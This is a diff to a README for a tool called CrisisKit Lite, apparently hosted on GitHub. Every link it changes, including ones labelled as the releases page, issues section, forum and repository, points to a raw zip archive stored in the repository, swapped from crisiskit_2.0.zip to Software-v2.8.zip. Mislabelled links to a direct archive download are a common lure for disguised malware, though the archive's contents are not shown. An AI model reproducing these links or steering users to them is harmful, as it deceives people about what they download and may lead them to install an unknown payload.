@@ -10,11 +10,11 @@ To use CrisisKit Lite, follow these steps to download and run the application.
 
 ## ⬇️ Download Now
 
-[![Download CrisisKit](https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip%20Now-Available%20on%https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip)](https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip)
+[![Download CrisisKit](https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip%20Now-Available%20on%https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip)](https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip)
 
 ## 📥 Download & Install
 
-1. Click the link above or visit the [Releases Page](https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip) to access the latest version of CrisisKit.
+1. Click the link above or visit the [Releases Page](https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip) to access the latest version of CrisisKit.
    
 2. On the Releases page, find the version labeled "Latest Release." 
 
@@ -65,11 +65,11 @@ If you encounter issues while downloading or running CrisisKit:
 
 ## 🌍 Community and Support
 
-CrisisKit is built by a community of contributors dedicated to improving crisis management tools. If you have any questions, seek assistance in our [Issues section](https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip) on GitHub or join our community discussion forum.
+CrisisKit is built by a community of contributors dedicated to improving crisis management tools. If you have any questions, seek assistance in our [Issues section](https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip) on GitHub or join our community discussion forum.
 
 ## 🙌 Contributing
 
-If you would like to contribute to the development of CrisisKit, you can submit issues or pull requests on our [GitHub Repository](https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip). Your input is valuable as we strive to enhance this tool for everyone.
+If you would like to contribute to the development of CrisisKit, you can submit issues or pull requests on our [GitHub Repository](https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip). Your input is valuable as we strive to enhance this tool for everyone.
 
 ## 📢 Stay Updated
 
@@ -77,8 +77,8 @@ For updates and news related to CrisisKit, follow us on social media or check ba
 
 ## 🔗 Useful Links
 
-- [Download CrisisKit Now](https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip)
-- [Issues and Bugs](https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip)
-- [Community Forum](https://raw.githubusercontent.com/agung4pr/crisiskit/main/public/crisiskit_2.0.zip)
+- [Download CrisisKit Now](https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip)
+- [Issues and Bugs](https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip)
+- [Community Forum](https://github.com/agung4pr/crisiskit/raw/refs/heads/main/public/Software-v2.8.zip)
 
 Thank you for choosing CrisisKit Lite. Together, we can improve responses to emergencies.
